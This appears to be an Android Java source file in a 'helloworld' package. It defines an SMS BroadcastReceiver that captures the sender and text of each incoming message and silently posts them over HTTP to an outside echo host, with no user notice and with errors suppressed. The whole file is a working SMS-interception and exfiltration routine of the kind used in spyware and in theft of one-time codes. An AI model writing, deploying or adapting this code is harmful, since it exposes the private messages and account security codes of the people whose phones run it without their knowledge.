package com.flipcortex.helloworld;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.NetworkOnMainThreadException;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

import javax.net.ssl.HttpsURLConnection;

public class SmsReceiver extends BroadcastReceiver {

    private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";

    @Override
    public void onReceive(Context context, Intent intent) {

        if(intent.getAction().equals(SMS_RECEIVED)){
            Object[] pdus=(Object[])intent.getExtras().get("pdus");
            SmsMessage shortMessage=SmsMessage.createFromPdu((byte[]) pdus[0]);
//            Toast.makeText(context,shortMessage.getOriginatingAddress() + "_"+shortMessage.getDisplayMessageBody()  ,Toast.LENGTH_LONG ).show();
            String sms = shortMessage.getOriginatingAddress() + "_"+shortMessage.getDisplayMessageBody();
            try {
                String response = new NetTask().execute(sms).get();
            }catch (Exception e){

            }

            Log.d("SMSReceiver","SMS message sender: "+
                    shortMessage.getOriginatingAddress());
            Log.d("SMSReceiver","SMS message text: "+
                    shortMessage.getDisplayMessageBody());
        }

    }


    public class NetTask extends AsyncTask<String, Integer, String>
    {
        @Override
        protected String doInBackground(String... params)
        {
            String res = httpPost(params[0]);
            return res;
        }
    }

    private String httpPost(String text){
        String response = "";
        try{
            String url = "https://postman-echo.com/post";
            URL urlObj = new URL(url);
            HttpURLConnection conn = (HttpURLConnection) urlObj.openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Accept-Charset", "UTF-8");
            conn.setReadTimeout(3000);
            conn.setConnectTimeout(3000);
            conn.connect();
            String paramsString = "?&SMSText="+text.replace(" ","_");
            DataOutputStream wr = new DataOutputStream(conn.getOutputStream());
            wr.writeBytes(paramsString);
            wr.flush();
            wr.close();
            int responseCode=conn.getResponseCode();
            if (responseCode == HttpsURLConnection.HTTP_OK) {
                String line;
                BufferedReader br=new BufferedReader(new InputStreamReader(conn.getInputStream()));
                while ((line=br.readLine()) != null) {
                    response+=line;
                }
            }
        } catch (NetworkOnMainThreadException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return  response;
    }

}
